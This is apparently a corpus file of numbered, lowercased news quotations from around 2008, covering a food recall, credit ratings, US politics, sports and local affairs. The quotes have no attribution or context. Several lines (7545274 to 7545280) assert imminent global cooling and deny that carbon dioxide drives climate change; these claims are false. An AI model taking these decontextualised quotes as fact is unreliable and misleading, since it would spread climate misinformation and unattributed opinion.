7544943 maple leaf products have not been directly linked to consumer illness and death
7544944 the cfia press releases identify that the strain of listeria that has been linked to illness and loss of life matches the listeria strain found in two maple leaf products
7544945 so from that perspective it would be premature to speculate on any financial liability what i can say is that in common with other food companies maple leaf does have and does purchase food liability insurance
7544946 its clear that confidence in maple leaf and our brand has been shaken
7544947 i feel very badly about that and i regret very deeply that i cant say what the long term implications will be all i can say is how well behave in the near term if we fundamentally do the right thing and act in the interest of public health we can rebuild that confidence

7544968 although the nyse has provided a six month cure period to remedy this situation the nyse has informed us that it also has the discretion to delist our shares at any time if they trade at sustained levels that are considered to be abnormally low
7544969 if a designated event occurs we cannot provide assurance that the company will have sufficient cash available to satisfy any such repurchase of notes

7544972 did not point out specific votes that could be considered conflicts of interest
7544973 get a first hand account of what the city is doing now
7544974 hes made great strides in establishing himself as a man concerned about the welfare of his fellow residents laboring to ensure the peoples voice is heard
7544975 recently wilk donned his public relations hat to promote a story about concerned local parents asking the hart district to reconsider a 300 million bond request then he turned around and roused the other side for comment
7544976 the actions of mayor newsom are unconscionable and a violation of this oath of office he swore to to uphold and defend the constitution of the us
7544977 you guys make up some stuff that is rubbish you should stop chasing controversy and watch the game
7544978 you need to come up with something better physically it wouldnt have been the right thing to let him play if he did that he would have let someone down
7544979 we didnt expect to see him back after halftime if id sent him out half busted with the game not on the line it would have been an unintelligent thing to do as a coach
7544980 i want to know whether he was injured or not
7544981 im only going on the same rumour you guys are going on
7544982 but there has been all this talk surrounding him he wants out he doesnt want out hes happy hes unhappy
7544983 hes in pain he said he was injured and i believe him
7544984 i told frank to get an arthroscope and that could lead to a reconstruction
7544985 there will be no release the only way he will leave this club is if he hops on a plane and goes to france then i will have to get the blueprint from the bulldogs to see what they did
7544986 rumours are a part of our game and the game thrives on it
7544987 where theres smoke theres fire but to say he was feigning injury is taking it a bit too far
7544988 i was trying to get him back on the field
7544989 i went in and said they need you back out there
7544990 he said to give him five minutes because he was dazed from a big hit and was trying to clear his head he was no good
7544991 the mausoleum of cyrus the great possessed a special sacredness during the islamic era thus the atabegs used the area as a mosque
7544992 many great works have been done by ismeo in pasargadae but transferring the ruins of the mosque which was from an ancient stratum was also a great mistake and was contrary to the international charter for the conservation and restoration of monuments
7544993 underage drinking is a serious threat to the health and safety of our young people

7544997 effective use of digital government tools on our state web portal makes it easier for users to conduct their business with government and provides measurable cost and personnel efficiencies
7544998 this prestigious endorsement of our efforts by the center for digital government is a win for the citizens of the commonwealth
7544999 virginia will continue its tough stance against drunk drivers and we will not allow back road escapes for people driving under the influence
7545000 we must remain vigilant to decrease these preventable traffic fatalities throughout the state
7545001 the message from law enforcement is as simple as it is clear if you choose to drink and drive we will catch you no matter what roadway you take

7545006 i told myself i needed to do better a silver medal wasnt enough i got the silver but i wanted the gold
7545007 i didnt want to go the other way down i wanted to go up so thats what i went home and decided id do
7545008 i worked hard i gave everything i had in me and gave the best i could and the results have been great
7545009 its kind of stressful im signing so many autographs and posing for pictures even when im going to eat
7545010 its fun sometimes but im still normal i still always get up late and sit around eating food and chilling with my friends
7545011 but everythings been great so far im trying to just enjoy myself because ive finished running now
7545012 my fans in europe will get a chance to see me because i have three more meetings there to come in zurich lausanne and brussels so theyll definitely see a lot of me before i go home
7545013 clothes on the catwalk are fine and they might wow the crowds but thats not always what will sell
7545014 anyone can design a pretty frock for a size eight model
7545015 dad looks after the business side of things and my mum is a supervisor on production
7545016 its not enough to be talented if you want to survive and also be competitive in sydney and melbourne then you have to be much smarter and more savvy about the way you do business
7545017 of course the glamour of the runway is there but what they really need to know are the bottom lines that any business has got to cope with
7545018 but at the end of the day they have to ask if people are going to wear it or not
7545019 yes you need to create your stamp but it has to be commercial and there are so many young designers that just dont get that you dont want to stamp out their creativity but they do need to know their market
7545020 we tend to glorify the industry and theres an assumption that because easton pearson or george wu are being sold in london then that means they must be making money but a lot of designers are not wealthy at all
7545021 selling a dress in a store in new york sounds good but it wont buy you a harbourside mansion
7545022 that was a real shock to me and i had to have a big rethink still now the most popular sizes are 10s and 12s
7545023 anyone can design a pretty frock for a size eight model
7545024 dad looks after the business side of things and my mum is a supervisor on production
7545025 maybe the packer family was unhappy with the share price plunging
7545026 when we extended mikes contract we believed we were entering a very difficult environment
7545027 we wanted to have the option of security of tenure
7545028 we also wanted to get the settings right for us as we got into the storm as dominic was saying we have probably passed through the eye of the storm
7545029 were seeing investors starting to move back into the space and so certainly things are looking rosier than they were
7545030 we see securitisation coming back but in smaller lumps of between 300 million and 700 million
7545031 the business grow and to see the share price go up
7545032 chinalco wishes to thank the australian government for the decision and chinalco is pleased that it now has the flexibility to increase its stake to 14 99 per cent in rio tinto plc should it choose to do so
7545033 it may perhaps allow them to express their views on the proposed takeover a little bit more loudly given that they are a major shareholder
7545034 but their stake isnt big enough to influence the outcome and i dont think the government is going to allow them to raise their stake from here
7545035 i think that race is always a factor in the minds of some people but i think thats the tiny minority here in virginia and around the country
7545036 i think that people are looking for whos going to fight for them in the white house
7545037 and if they have confidence that im going to make their lives better their childrens lives better i dont think they care whether im green or blue or polka dot
7545038 nobodys going to take the guns of law abiding virginians away from them
7545039 we need to do things to reduce the numbers of abortions through support for adoption and support for mothers and providing education and various strategies to reduce unwanted pregnancies
7545040 the fact that were tied i think that sends a good signal about what were doing
7545041 this is a state in transition obviously the success of former gov mark warner and tim kaine and sen jim webb indicate that democrats can win statewide but its going to require everything weve got in order to pull this out
7545042 hes one of my earliest supporters he was my earliest gubernatorial endorser outside of my home state and he is a great friend of mine
7545043 it has certainly been regarded as something the league has done well in terms of education
7545044 without greg birds qualities as a footballer it makes it a lot tougher for us
7545045 i have assured the players that i am going to unite the players like you have never seen before
7545046 i am going to make this a journey they will remember
7545047 im still not over it yet maybe if you ask me in a week i could tell you everything is going to be ok but right now im still kind of sick about the whole thing
7545048 father forgive them for they do not know what they are doing
7545049 he saved others let him save himself if this is the christ of god his chosen one
7545050 if you are the king of the jews save yourself
7545051 do you not even fear god since you are under the same sentence of condemnation 41 and we indeed are suffering justly for we are receiving what we deserve for our deeds but this man has done nothing wrong
7545052 truly i say to you today you shall be with me in paradise
7545053 but the other answered and rebuking him said do you not even fear god since you are under the same sentence of condemnation
7545054 and we indeed are suffering justly for we are receiving what we deserve for our deeds
7545055 if you confess with your mouth that jesus is lord king and believe in your heart that god raised him from the dead you shall be saved for with the heart man believes resulting in righteousness and with the mouth he confesses resulting in salvation and whoever calls on the name of the lord shall be saved
7545056 but the parrot will have no logical understanding or agreement with what he is saying

7545062 im anlassfall kann daher von einer freiwilligkeit des weiteren handelns der beschwerdef hrer nicht gesprochen werden
7545063 im gegensatz zum leoben match hat etwas der dampf gefehlt das liegt aber wohl eher an der einstellung als an der verfassung au erdem habe ich gegen den hck in der zweiten halbzeit die u21 eingesetzt
7545064 there are a lot of details that have to be worked out
7545065 virginia is committed to extending an economic ladder to anyone with the ability and drive to access it
7545066 reducing poverty providing job training and employment opportunities and nurturing a climate of self sufficiency are defining qualities of the commonwealth
7545067 the will of our clients in concert with the efforts of 120 local departments of social services to assist with training and job opportunities is far reaching
7545068 then the teacher yelled chili pepper pasta and everyone hit the floor

7545071 a lot of democrats will vote mccain its ok really
7545072 there are a lot of delegates here who had passionate choices in an extended primary season
7545073 we feel confident that if we can demonstrate a record of change a record of vision a team of barack obama and joe biden can convince democrats republicans and independents to support a ticket of change in november
7545074 i am here because of the opportunities that my father had that my mother had you know we are who americans were supposed to be
7545075 i think what youll conclude is hes sort of like us
7545076 he comes from a middle class background he went to school on scholarships he had to pay off student loans he and his wife had to worry about child care they had to figure out how to start a college fund for their kids
7545077 no se le han hecho m s inspecciones que a otra compa a a rea espa ola y no se han detectado en ning n caso alg n tipo de problema que afecte a la seguridad

7545108 weve found over numbers of years whenever the economy tends to go down more people go back to school and thats kind of a national trend but really its just going unusually a large amount here at virginia western this particular semester
7545109 we have water cannons ready to cope with any eventuality
7545110 we want our land back money cannot compensate our losses we are farmers and we want to live by farming
7545111 the tatas should bow down before peoples power and return the land
7545112 if the state for any reason feels that we are exploiting them if that is the feeling we will exit
7545113 there is 2 types of news being made one is who he chooses and how he chooses that person
7545114 every campaign is about its about controlling the message and theyre able to control this message completely providing the info directly to their audience
7545115 we have 88 different nationalities that live in the roanoke valley and so how can the ymca serve those folks better learn more about their cultures help them as the assimilate back into our world and our valley and i think the y can play an important roll in that
7545116 bob covered you when you were in high school and he covered your kids and he might have even covered your grandkids and he is a continual thread through the community and he really did keep up with everyone

7545119 each person adapts differently from the experience that theyve had so when brad comes back its a case of what effect did it have on him if any
7545120 all of our young men are coming back tonight and that makes it even more special
7545121 auto und strategie waren heute so stark dass wir sogar ganz vorne gefahren sind
7545122 nat rlich haben wir noch platz f r verbesserungen damit wir dauerhaft gegen die gro en teams fahren k nnen aber heute haben wir bewiesen dass wir ein auto besitzen mit dem wir gegen sie antreten k nnen

7545129 the land trust was very pleased to make this donation happen
7545130 by accepting the donation of land in 2006 and holding it until the state could take ownership we were able to add significantly to the natural area and protect an area that may have otherwise become another subdivision
7545131 were grateful for the kindness of the melchor family as well as the commitment to the project from the western virginia land trust
7545132 the support is an excellent example of different groups of people working together to achieve something that will benefit all of virginias citizens
7545133 as a private organization sometimes we can act more quickly than the government
7545134 we act as an intermediary and accept land when the owner is ready to donate it and then transfer it to the government later when theyre able to accept it
7545135 the arrival of these two boats is a very symbolic gesture for the palestinian cause to end the siege end the occupation in fact those phrases are written across the peace boats which carry flags from more than 70 nationalities
7545136 we deeply appreciate and salute the activists on the two boats
7545137 the two boats defiance the of the israeli blockade is a glimmer of hope that could be an opening of an end of the siege

7545155 and weve raised more money than the 40 million we originally budgeted because we had to is it easy raising that kind of money no its never easy
7545156 mr farbers activities are a public display of how corporate connections fuel politics exactly the type of special influence that mr obama had pledged to expunge from politics when he said he would not accept donations from lobbyists

7545166 the smallest of actions is always better than the noblest of intentions
7545167 we therefore feel that these repeated defaults and violations have forced us to withdraw our support from the ruling coalition and sit on the opposition benches

7545201 rep demand for a federal investigation will focus on the interactions or lack thereof between hillsborough county law enforcement and ice surrounding the arrests and releases of alleged serial rapist and illegal immigrant rigoberto moron martinez
7545202 have been permanently scarred by these brutal rapes events that could have been avoided if hillsborough county had followed the law reported this illegal immigrant to federal authorities and held him for trial and deportation it is clear to me that we need a federal investigation of the events surrounding the arrest and release of this man and if warranted new leadership at the hillsborough county sheriffs office
7545203 unfortunately for the lives of the women raped by this illegal immigrant ringleader and his two accomplices it appears that some area law enforcement officials may not have had the proper training and tools to work with ice and federal officials
7545204 hopefully a federal investigation will identify the areas where hillsborough county st petersburg and ice dropped the ball with identifying and deporting this man and we can all work together to find ways to ensure that it wont happen again

7545274 based on this analysis we can say that there is a 94 percent probability of imminent global cooling and the beginning of the coming ice age
7545275 most of these major natural processes that we are witnessing now are interdependent and occur at the end of each interglacial period ultimately causing sudden long term cooling
7545276 stock up on fur coats and felt boots earth is now at the peak of one of its passing warm spells it started in the 17th century when there was no industrial influence on the climate to speak of and no such thing as the hothouse effect
7545277 carbon dioxide is not to blame for global climate change sorokhtin said
7545278 solar activity is many times more powerful than the energy produced by the whole of humankind mans influence on nature is a drop in the ocean
7545279 if we are facing a crisis at all i think it is that we are preparing for warming when it is looking like we are cooling we are preparing for the wrong thing
7545280 there is no evidence that carbon dioxide has ever driven or will ever drive world temperatures and climate change worrying about carbon dioxide is irrelevant

7545285 we must recognize that such a sadc free trade area will serve the expansionist aims and interests of south african companies not the equitable and more balanced trade development that enables cross border trade especially by small women traders
7545286 where is the fair trade when cross border female traders are forced to spend hours waiting at the border
7545287 is a deal for south african businesses there is nothing in it for sadc all it will do is to choke the life out of small businesses in the region
7545288 the sadc fta is a welcome development but in the regions current state it is just an elite deal which does not take small business and ordinary people into account we will not stop campaigning against the fta whether it is signed or not

7545307 the world can be divided into two kinds of people
7545308 when 70 percent of the nations soybeans 62 percent of the corn and 22 percent of our domestic petroleum are transported by barges we need a strong federal commitment to keep this system open and functioning
7545309 its unfortunate that some of our ports and harbors may have to close when agriculture is one of the few positive contributors to this nations balance of trade
7545310 barges are a far more economical method of shipping than rail or truck the nations shippers save 3 billion a year by moving their goods by barge the typical barge can move 750 000 bushels of corn that same amount would require 870 trucks
7545311 pipelines and railroads are already at maximum capacity and building new facilities is difficult because of environmental and other regulatory requirements
7545312 theres a lot of room to grow traffic on the mississippi and other inland waterways
7545313 but maintenance and improvement of locks dams and other facilities are critical to insure the most efficient barge usage
7545314 27 are past their design life and in varying stages of disintegration its disheartening whats happening to the infrastructure on the mississippi river

7545316 ethanol production in the united states has increased fivefold within the last few years and continues to climb
7545317 for every pound of ethanol produced nearly 1 pound of ddgs is produced but its market has not expanded
7545318 most corn to ethanol plants are farmer cooperatives and their financial resources are limited
7545319 if the plants are going to modify their current operations they need technology with low capital investment to minimize financial risk and uncertainty
7545320 we wanted to know how much of the nutrients in enhanced ddgs was available to the birds how much of it they retained and how much quality improved
7545321 after we look at the nutrition and handling issues we will be able to determine what the next stage of enhanced ddgs research should be

7545335 earlier i used to feel that to learn with them itll be a problem for me where my percentage may be low but after i interacted with them i began to help them my parents also saw the improvement in my percentage and i believe they challenged kids will be bright kids and will make the country proud and become somebody some day
7545336 the previous school taught things in a very bad way none used to sit or eat with me no one studied along with me however here im feeling nice every one gets along we study and eat together
7545337 when parents of challenged children in 1999 approached us it was totally a new thing i wanted to help these children and i included them in the normal stream i started with four students only we tried it as an experiment and for that experiment i had to give a big prize because normal parents didnt accept it those days the school was very small heavy withdrawal started taking place in 1999 we had strength of 100 normal students when i took those four students around 40 normal students withdrew as we are taking such autistic and challenged children
7545338 we are at a firm stage and with a pride we can say we have around 70 challenged students and 700 of normal students and theyre interacting very well and the society also accepts it

7545345 as you know that beijing olympics concluded on sunday but it has been very clear that our tibetan situation is getting worse and worse we get no information as there are no media rights inside tibet so we dont know what is going on inside tibet but we came to know that lots of people have been killed inside tibet so we want the international community amnesty international and the united nations to put pressure on china and send delegation to find out the real situation in tibet

7545380 one of the greatest challenges facing the american church is to not allow religious busyness to substitute for genuine spiritual transformation
7545381 mais qui est ce monsieur avec son masque tom ben cest trois euros
7545382 given the acceleration of declines in newspaper advertising revenue and cash flow at tribune and no evidence from any participants in the industry regarding the prospects for current pressure relenting fitch believes tribunes credit profile is consistent with a ccc rating
7545383 certainly there are some levers that the management tam can pull that can have a positive effect but the one factor thats most important is the top line operating trend and thats the relentless pressure theyre feeling in the classified space
7545384 until we see a reversal in those trends default is a real possibility
7545385 fitchs estimate that 0 recovery is realistic in a distress scenario
7545386 tribune management has met or exceeded fitchs expectations on the elements of its business over which it has more explicit control expense containment asset sales and exclusive dedication of cash flow toward debt repayment
7545387 fitch believes trb tribune management has distinguished itself from other newspaper management teams by taking aggressive actions across various areas of the company to attempt to preserve the longer term health of the company bringing in new leadership from outside the industry communicating directly with staff about the challenges facing the industry reducing headcount re tooling incentive compensation for sales teams redesigning the product exploring asset monetization utilization opportunities and experimenting with new revenue streams
7545388 in the long run fitch is concerned about the companys ability to generate cash to meet its interest payments principal amortization and maturities under its debt obligations in a timely manner
7545389 while the company could receive an amendment or waiver from the banks if it breaches a covenant in this credit environment fitch is uncertain and cautious regarding the terms of such a potential negotiation for such a highly leveraged entity with deteriorating prospects
7545390 in this scenario the receipt of a waiver or amendment without an upturn in business prospects is not likely to have a positive impact on the rating however failure to receive covenant relief could result in a restructuring not necessarily bankruptcy that would likely further pressure ratings
7545391 it was eerie but on the other hand when looking at it from stauffenbergs viewpoint and what he did and what these men did it was powerful
7545392 as an actor i think i can say for all of us who were there that we felt fortunate to get those locations and shoot at those places it really changes the performances to do it there at that spot
7545393 these guys are true american patriots they were fighting two wars

7545396 the one thing he didnt have with the relationship was that quantum of solace
7545397 its rare where you get a piece of material thats politically pertinent like this but also sort of non preachy and engaging entertainment for an audience
7545398 he doesnt want to be a monster he doesnt want to kill people
7545399 he loves her but if he gets too passionate he will want her blood he will want to kill her

7545401 this was two lone wolves its a duel two complicated fascinating really brilliant people
7545402 for men with their histories their intelligence their egos a contest like this really did become kind of life and death

7545416 there have definitely been some ups and downs sometimes it seems there have been more downs than ups but it builds your character it makes you want it harder

7545437 sometimes you have to go out on a limb because thats where the fruit is
7545438 in the words of renowned investor shelby davis you make most of your money in a bear market
7545439 when the stock market tumbles investors tend to react in one of two ways either they panic and sell their stake or they expand their equity in businesses that show a strong foundation for long term growth
7545440 the stock exchange is the only store in the world where when prices drop and things go on sale most people run for the exits
7545441 we have focused on companies that reduce their exposure to market volatility and offer the best prospects for long term growth we also gave a thorough scrubbing for access to cash and potentially concerning debt levels
7545442 earnings growth is important but doesnt speak to current or long term stability like cash in the bank we also assume that access to new capital equity or debt will be more difficult than at any time over the past 10 years
7545443 government subsidies that had fueled the two largest markets in the world germany and spain are coming up for debate while the polysilicon materials on which many solar panels are based continue to be in short supply
7545444 meanwhile venture firms put more than 1 billion into solar start ups last year and close to 1 billion more this year first solar is a little better protected than most against market volatility than its peers with available cash and equivalents on the books of 590 million
7545445 but the vast majority of its enterprise value is hitched to future growth
7545446 plus cdte generates electricity more cheaply than polysilicon and will likely continue to be more cost effective until polysilicon prices drop to 70 kg

7545468 we can usually cook what people want when they make requests
7545469 and our menu is constantly getting additional items sometimes we have a fish fry and sometimes we have other dishes that people request

7545471 the best thing about our store is our family of employees
7545472 no one works for someone we all just work together
7545473 and it goes without saying that we love our customers too
7545474 to announce that there must be no criticism of the president or that we are to stand by the president right or wrong is not only unpatriotic and servile but is morally treasonable to the american people
7545475 government has a final responsibility for the well being of its citizenship if private cooperative endeavor fails to provide work for willing hands and relief for the unfortunate those suffering hardship from no fault of their own have a right to call upon the government for aid and a government worthy of its name must make fitting response
7545476 i am not an advocate for frequent changes in laws and constitutions but laws must and institutions must go hand in hand with the progress of the human mind as that becomes more developed more enlightened as new discoveries are made new truths discovered and manners and opinions change with the change of circumstances institutions must advance also to keep pace with the times we might as well require a man to wear still the coat which fitted him when a boy as civilized society to remain ever under the regimen of their barbarous ancestors

7545480 should any political party attempt to abolish social security unemployment insurance and eliminate labor laws and farm programs you would not hear of that party again in our political history there is a tiny splinter group of course that believes you can do these things among them are a few other texas oil millionaires and an occasional politician or business man from other areas their number is negligible and they are stupid
7545481 i would say off the floor the turning point of the game was the second intermission
7545482 we had a fired up pep talk from our coaches on the floor though it was our fourth goal that really started our machine offense and defense stepped up huge we went all out
7545483 i waited for the block to get set so i could shoot around the screen the goalie didnt see it at all you could tell
7545484 he went to the wrong side and i caught him off guard
7545485 it was such a close game and being able to get that one goal is just phenomenal
7545486 if ryan trades dawson for any combination of players or draft picks he is out of his mind
7545487 as you approach texas 60 between 12th street and adams look both ways
7545488 if you see the newly installed beacons on the backside of the school assemblies flashing the school speed limit is 20 mph
7545489 we will have extra patrol out on the streets next week mainly to remind the public that school is starting and we need to look out for the safety of the children
7545490 the tone mr khamenei used to support mr ahmadinejad suggests that his intention was more than defending him against the attacks
7545491 it appears that mr ahmadinejad and mr khamenei share the same views over major policies and ideological values such as resisting the west and the nuclear policy
7545492 comprehensive technical and management approach for the recovery of electronic mail records
7545493 to be restored range from as few as 25 to as many as 225 days
7545494 the office of administration working with outside technical experts is conducting a thorough accounting of the e mail archiving system
7545495 it is important that that work be complete and accurate and therefore they are taking great pains to do a through analysis thats where we are
7545496 the white house is taking some steps to recover these e mails thats good
7545497 on the other hand they have waited very late and its not going to be done for quite a while
7545498 over a dozen area churches will be working together to make the school supply give away our main focus
7545499 we set the goal at 500 and we usually reach our goal
7545500 this year we are simplifying and trying to make the focus the school supply give away
7545501 its all different churches working together for the cause of christ to serve the community
7545502 why should i be responsible for paying for joe bidens brain aneurysms
7545503 have made it very clear that they support socialized health care
7545504 i know it sounds kind of curt in this age of political correctness and altruism but why should i be responsible for paying for joe bidens brain aneurysms
7545505 to announce that there must be no criticism of the president or that we are to stand by the president right or wrong is not only unpatriotic and servile but is morally treasonable to the american people

7545512 its almost unheard of to be able to recover every single stolen item except for cases of beer and some food in something like this
7545513 sgt kurtis brown investigator responsible for recovering stolen property and identifying the suspects went outside the box and really gave an extra effort to make this happen
7545514 once those patrol officers were able to give brown some information they obtained during that traffic stop he ran with it
7545515 we located the 19 year old man and he is turning himself in today
7545516 we still have not located the other suspect and we hope we can get the public to help us out with that
7545517 burglars scout areas and target the places that are most vulnerable
7545518 during one of the suspect interviews they revealed different areas in the county that they planned to burglarize
7545519 they told me that the only thing that would have stopped them is if they got caught
7545520 we really want to commend kurtis brown on everything hes done to help solve this case so quickly and completely
7545521 if you have an inquiry you can tailor it individually
7545522 this is a planning took where all things are going
7545523 everything was going good until he started messing around on me
7545524 im sorry for shooting duke but he hurt me very bad love hurts and you dont play games with people s feelings
7545525 was going to shoot him in the leg but he wouldnt come around to my side of the car
7545526 on behalf of our 600 chamber members and staff i want to welcome you to this lunch and thank you for everything that you do for our youth and the success of our youth
7545527 i just wanted to briefly touch on a couple of items one of them is of significant importance to bay city and matagorda county as im sure all of you have seen over the last couple of years the economic growth in the city and the county
7545528 over the next five to 10 years there will be a real need for over 2 000 well educated well trained folks here in bay city to meet the needs of that growth and fill that workforce
7545529 that is a partnership of industry the independent school districts and the junior college and you can help by educating the kids in the classroom and motivating them to be a part of that program and to be a part of the future of matagorda county
7545530 i dont think she could have been successful without the support of the experienced teachers here at the school district the staff and administration
7545531 i know that support will be here for you and i encourage you to take advantage of that and im sure youll be successful
7545532 i know your job is demanding tiring frustrating but at the same time i also challenge you to be a part of this community because volunteers like you make this community what it is
7545533 so this year in addition to your busy day take a few moments become a member of the chamber become active in your church and theres plenty of other organizations in town like the united way red cross they are all looking for great volunteers
7545534 you have a great challenge and a great opportunity so i want to wish you the very best
7545535 tetts jewelers has always been dedicated and committed to the local schools civic organizations and service organizations
7545536 it is fitting that the city of bay city recognize and congratulate tetts jewelers on this important milestone
7545537 tetts jewelers has also employed many local citizens and has played a major role in improving the economy of our community
7545538 kenleigh is growing up in this shop just like i did
7545539 she even plays with some of the exact same baby toys that i played with when i was being raised here
7545540 we also have a forecast of rain this week its supposed to be a wet week
7545541 we would ask residents to please be careful as they start burning
7545542 there is still a lot of dry grass and fuel on the ground that could cause a fire hazard so do be cautious as you burn
7545543 since stp is a complicated partnership we needed to make sure with the texas governors office that we were nominating the proper entity
7545544 instead of applying in the september application period we will apply in the december application period
7545545 there are still some issues of concern that we need to work out before you approve this
7545546 weve also seen an increased number of stolen license plates so that if a gas station attendant copies down the license plate number it cant be traced back to the proper owner of the vehicle
7545547 these store owners are the ones losing money from all of these drive offs but they are hesitant to require their customers to pay first because they focus on customer service and they dont want to inconvenience their patrons
7545548 we are hoping this will really help to reduce the fuel theft instances
7545549 we estimate shoppers will save about 54 million in sales tax during the sales tax holiday including approximately 42 1 million in state sales tax and 11 9 million in local sales taxes
7545550 many of you have heard all of the bad news in the press lately about housing and wed like to try to give you some good news today
7545551 after he beat her and threatened her with a gun he walked to his car aimed his gun into the air and fired it once as an exclamation point
7545552 well were gonna turn the civic center into a honky tonk thats pretty much what we do you know we have a great honky tonk band with fiddle and steel and all that
7545553 were going to be doing as many of our old songs as we can and plus weve got the new cd out and were going to be doing some new songs from that
7545554 it took me a little over two years to finish this album and i think that this is probably the best one ive ever done mainly for the fact of the quality of the songs
7545555 i had more time to choose songs to write songs and then we had more time in the studio to lay them down
7545556 once that single was out and working its way up the charts we were looking for songs and recording
7545557 these days singles can have a life span on the radio of about six months so we took advantage of that to get the album just right
7545558 were real excited about playing the show in bay city because we dont get to play texas enough
7545559 for the last three or four years weve gone to europe every year to do some tours and last summer we were in japan doing tours for a couple of weeks but this year were staying here at home trying to get this cd off the ground
7545560 its the song that started my career its a classic country song and its still my favorite one to do
7545561 if it hadnt been for that one song i dont know if i would have had a career
7545562 ill be going home after that concert and doing some fishing on the upper texas coast i havent been fishing in over two months so im a little depressed about that because thats my thing man fishing on the bays
7545563 weve been working so much im just ready to get the kids back in school
7545564 i havent had a chance to take them fishing either but theyre more interested in playing guitar anyway
7545565 the last couple of summers i would take one of them out at a time and let them come out on the road with me for two or three days on a short run but i learned real quick that was a mistake
7545566 young boys theyre out there on the bus and having a good time seeing us playing music and having a good time and next thing you know theyre talking about thats what theyre going to do for a living but i want them to get an education
7545567 they can mess with music as a hobby but theyve got to get an education
7545568 when i quit school when i was a junior in high school i was extremely lucky that i got a career going and that i was successful
7545569 they dont really understand the struggle they dont really understand the financial stress were under constantly
7545570 you cant quit school and be a successful anything anymore even in music
7545571 the main thing is i want fans to go out and get that new cd thats in the stores right now
7545572 but if the fans want that cd and they cant find it in the store tell them to talk to the manager tell the store or department manager to get that cd and they will get it
7545573 i usually dont have time to do autograph signings at the show but i do sit on the bus and i sign hundreds of cds
7545574 i sit there and take them out of the plastic and everything else and sign them
7545575 im pleased to report the city got an unqualified opinion
7545576 the operation is running on all eight cylinders were getting information quicker of that were quite thankful and hopeful
7545577 i guarantee you wont see any after that date june 30 2008
7545578 it was more of a logistical problem than a financial one
7545579 the lateness of the 2006 2007 report was not attributable to them
7545580 this officer recognized the owner of the vehicle as someone that was wanted by our department
7545581 the individual finally came to a stop in the parking lot of sansings convenience store
7545582 the pursuit never reached a high rate of speed and no people or property was damaged in the pursuit and arrest
7545583 there are no known suspects but there are some persons of interest
7545584 but he said this project really looked like it was doable
7545585 the surveys are coming in well one of the problems is that several have come without addresses
7545586 dinamica economiei romanesti din ultimii ani se reflecta si in cresterea numarului de vehicule comerciale implicit a necesarului de piese scule si consumabile specifice
7545587 they had already picked a huckster lawyer from tennessee for vice president and they werent going to allow a roll call
7545588 overall it was a great experience but i expected more of the party of principles and more of chuck baldwin
7545589 they displayed no more principles than the democrats or republicans

7545595 we had originally intended for american idol to have four judges
7545596 weve seen from our international series that having a fourth judge creates a dynamic that benefits both the contestants and the viewers
7545597 for the past seven seasons paula has had to endure the experience of being the only woman at the judges table shes been as an island of consideration and gentle criticism between randy and simon offering her invaluable expertise as a performer and no 1 artist to the thousands who have competed on american idol with kara by her side paula finally has some back up and now there is going to be a lot more girl power on the show

7545611 obviamente joe y yo hemos estado en diferentes campos filos ficos pero le considero un buen amigo y un buen hombre
7545612 el apoyo de la senadora para barack obama es claro
7545613 clinton ha dicho repetidas veces que barack obama y ella comparten el compromiso de cambiar el rumbo del pa s de sacar a eeuu de irak y de ampliar el acceso a la asistencia m dica
7545614 es interesante que eso no aparezca en el aviso de los republicanos
7545615 russia intends to inform various wto partners of its withdrawal from accords that contradict its interests
7545616 it turns out that we dont see or feel any pluses from membership and if there are some we still carry a burden
7545617 we need to get things clear with our partners we need to think most seriously about protecting our manufacturers
7545618 this doesnt mean we should renounce our strategic course towards the wto but there should be some clarifications on this question elementary fairness should prevail
7545619 they wanted to enter europe in a big way and probably this is the reason why they have paid a higher premium
7545620 its a positive sign for the company because they were sitting on a huge cash pile and it was not generating any return

7545646 ce quon veut changer cest les modalit s de mise en oeuvre de ce dispositif cest dire quon ne veut plus dun ch que on veut quil soit sur la fiche de paye du salari
7545647 mais le principe lui m me dune participation de lentreprise aux frais de transport du salari qui existe d j dans les entreprises de certaines r gions notamment est un principe qui existait et que nous ne pouvons pas remettre en cause

7545662 weve had two great exports from germany sauerkraut and the feed in tariff
7545663 germany has pole vaulted over other countries when it comes to clean energy technology and thats gotten peoples attention
7545664 the big energy companies have too many vested interests in sticking with conventional energy sources
7545665 it used to be only idealists were interested in solar
7545666 but now theres money to be made from the sun
7545667 if you force utilities to pay heavily subsidized above market rates somebody will have to pick up the tab and its going to be customers
7545668 this is the sharpest tool in the toolbox because its the most effective in driving investment into renewable energy
7545669 it also promises the tremendous side effect of making america competitive in green technology but we have to act soon because there isnt much time to lose
7545670 gtgs long lasting relationship with forsyth county as well as the countys devotion to a successful gis makes them a perfect host for the gis managers workshop
7545671 together we will provide insightful and practical examples of how a gis can be successfully implemented
7545672 i immediately got up and introduced myself to him and we had a nice talk before i returned to my table which was people from ohio
7545673 i met cincinnati mayor mark mallory at the airport and his parents and started meeting several people from ohio on the plane who were going to denver for the convention
7545674 it has been great so far i am seeing a number of ohioans who either i or jerry eileens husband served with in the house of representatives in columbus and i am meeting more people from ohio and west virginia
7545675 at our table last night i also met a woman delegate from pittsburgh and two gentlemen from bucks county pa
7545676 the entertainment at the red rock amphitheater included sheryl crow sugarland the dave matthews band the blue man group and a skit featuring will farrell who portrayed president bush talking about global warming
7545677 we were officially welcomed by the mayor of denver as well as the colorado governor and the afternoon and evening was titled green sunday with the focus on ecology
7545678 robert kennedy jr an environmentalist spoke on the need for alternative fuels and renewable energy
7545679 there are a number of receptions scheduled throughout the day and i am looking forward to being on the convention floor to hear michelle obama speak tonight i have seen her on videos before but this will be the first time i will get the chance to hear her speak in person
7545680 the clinton delegates are scheduled to meet with sen clinton wednesday at 1 15 p m and the anticipation is she will officially release her delegates at that time and urge us to support senator obama but i was elected to vote for her and will maintain that commitment on the first round of voting when sen clintons name is placed in nomination
7545681 lets not beat about the bush the performance was not good enough and we cant hide from that
7545682 weve not done as well as we can and should do and thats got to change
7545683 whoever goes out against macclesfield is putting themselves in the frame for the blackburn game
7545684 i doubt if the politicians promoting this have any idea what theyre promoting
7545685 you can store information using it you can communicate information using it
7545686 most of us who become mathematicians do so not because of our education but in spite of it
7545687 were turning kids off a subject that is useful and incredibly interesting and beautiful if taught correctly
7545688 i first took algebra in eighth grade from a bilious creepy teacher who called all the girls hon and all the boys son
7545689 at any age we will take the drudgery as long as we see a reason to do it
7545690 it takes the arithmetic youve learned and lets you answer questions not just 5 4 what it lets you change the unknown to 5 what 20
7545691 in fact if i had to design a mechanism for the express purpose of destroying a childs natural curiosity and love of pattern making i couldnt possibly do as good a job as is currently being done
